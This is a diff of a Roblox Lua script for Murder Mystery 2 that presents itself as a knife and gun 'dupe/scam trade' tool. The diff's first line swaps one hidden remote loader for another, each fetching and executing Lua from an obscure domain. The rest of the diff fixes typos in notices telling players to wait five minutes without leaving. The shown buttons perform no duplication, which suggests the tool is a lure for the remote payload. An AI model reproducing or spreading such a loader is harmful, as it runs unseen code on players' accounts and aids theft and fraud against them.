@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/1175f96f72b11c5b4b1b5f24.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/b9d4ae0ca30a7b10230b41a6.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 
@@ -8,7 +8,7 @@ local Window = OrionLib:MakeWindow({Name = "Dupe/Scam trade MM2", HidePremium = 
 
 ---Tab---
 local Tab = Window:MakeTab({
-	Name = "Dupe Kinfe/Gun",
+	Name = "Dupe Knife/Gun",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
@@ -32,7 +32,7 @@ Tab:AddButton({
 	Callback = function(knifedupe)
       		OrionLib:MakeNotification({
 	Name = "Warning!",
-	Content = "Wait for 5 minute for dupe",
+	Content = "Wait 5 minutes for the dupe",
 	Image = "rbxassetid://4483345998",
 	Time = 120
 })
@@ -47,14 +47,14 @@ Tab:AddButton({
 	Callback = function(knifedupe)
       		OrionLib:MakeNotification({
 	Name = "Warning!",
-	Content = "Wait for 5 minute for dupe",
+	Content = "Wait 5 minutes for the dupe",
 	Image = "rbxassetid://4483345998",
 	Time = 120
 })
   	end    
 })
 
-Tab:AddParagraph("Warning","Equip Knife or gun and wait for 5 minute without leaving")
+Tab:AddParagraph("Warning","Equip Knife or gun and wait 5 minute without leaving")
 
 
 
